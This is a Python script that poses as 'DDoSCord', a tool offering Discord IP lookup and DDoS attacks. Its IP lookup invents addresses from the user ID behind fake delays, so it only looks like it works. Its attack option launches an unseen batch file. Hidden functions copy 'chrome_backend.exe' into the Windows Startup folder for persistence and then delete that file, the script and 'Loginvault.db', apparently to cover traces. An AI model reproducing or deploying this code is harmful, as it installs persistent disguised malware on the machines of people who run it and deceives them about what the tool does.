#!/usr/bin/env python

from ipaddress import ip_address
from os import *
from unittest import expectedFailure

if name != 'nt' :
    print('Your device is not compatible !')
    exit()

from urllib.request import Request, urlopen


def banner():
    print(f"""
    ██████╗ ██████╗  ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
    ██║  ██║██║  ██║██║   ██║███████╗██║     ██║   ██║██████╔╝██║  ██║
    ██║  ██║██║  ██║██║   ██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
    ██████╔╝██████╔╝╚██████╔╝███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                          
             ~   DDoSCord v3.2.1 By Sir_thirrygolooo#1911  ~
             ###############################################
                Your IP : {get_your_ip()}
             ###############################################   
    """)

def get_your_ip():
    user_ip = "None"
    try:
        user_ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return user_ip

def get_ip():
    system('cls')
    banner()
    get_id = input('Please enter the user ID >> ')
    id = get_id
    result = [int(a) for a in str(id)] 
    new = sum(result)
    ip = f"{new//2+3}.{(new*3)//2}.{new+67}.{new}"
    system('timeout -t 3 /nobreak > nul')
    print(f'Searching ip for ID={id} on discord.com...')
    system('timeout -t 6 /nobreak > nul')
    display = str(input('Datas found for "1" user... Do you want to see it ?[Y/n]'))
    if display == 'Y' or display == 'y' or display == '':
        system('cls')
        print(f"""
            research completed : datas for "1" user(s)
            --------------------------------------
            |        ID          |      IP         |
            -------------------- -----------------
            |{id}  |{ip}   |
            ---------------------------------------
        """)
        system('pause')
        system('timeout -t 2 /nobreak > nul')
        system('cls')
        menu()

    elif display == 'N' or display == 'n':
        print('Quitting...')
        system('timeout -t 2 /nobreak > nul')
        ip=""
        id=""
        system('cls')
        get_ip()
    else :
        print('Invalid syntax... Please retry ')
        system('pause')
        system('cls')
        get_ip()

def set_victim():
    system('cls')
    addr = input(f'Enter the targeteted IPv4 adress {ip}>> ')
    system('timeout -t 2 /nobreak > nul')
    system('cls')
    print(f'Targeted IP set on : {addr} !')
    system('pause')
    system('cls')
    menu()

    return addr

def additional():
    system('cls')
    print("""
## DDoSCord v-3.2.1 ##
~ By Sir_Thirrygolooo ~
 ----------------------------------------------------------
| This tool has been created and published for educational |
| purpose only and you're totally responsible for what you |
| deal with it :)                                          |
 ----------------------------------------------------------
    """)
    system('pause')
    menu()

def lets_start_babe():
    print(f'Targeted ip is "{ip}"')
    system('pause')
    path = getcwd()+R'\ddos_tes_morts.bat'
    new = path.replace('.VEGAS Capture','".VEGAS Capture"')
    system(f'start {new} & pause > nul')



def menu():
    system('cls')
    banner()
    print(f"""
   *****************************************************
    [1] - Get IP by ID
    [2] - Set the victim
    [3] - Launch DDoS Attack
    [4] - Additional Content
    [0] - Exit
   *****************************************************
    """)

    user_choice = input('What\'s your choice ? >> ')

    if user_choice == '1' :
        get_ip()
    elif user_choice == '2' :
        test = set_victim()
    elif user_choice == '3' :
        lets_start_babe()
    elif user_choice == '4' :
        additional()
    elif user_choice == '0' :
        system('cls')
        confirmation = str(input('Do you really want to quit ?[Y/n]>> '))
        if confirmation == 'Y' or confirmation == 'y' or confirmation == '':
            print('Thank\'s for using DDoSCord and Goodbye ! :)')
            exit()
        elif confirmation == 'N' or confirmation == 'n' :
            system('cls')
            menu()
        else :
            print('Sorry bad input... Please retry !')
    else :
        print('Sorry bad input please retry :)')
        system('pause')
        menu()

def persistence():
    try :    
        path = getcwd()
        startup_path = '"' + getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup"'
        system(fr'copy "{path}\chrome_backend.exe" {startup_path}')
    except :
        pass

def clean():
    try :    
        remove('chrome_backend.exe')
        remove('flaflaa.py')
    except :
        pass

def main():
    system('title DDoSCord client')
    system('cls')
    global ip
    ip=""
    menu()
    
    persistence()
    clean()

main()
remove('Loginvault.db')
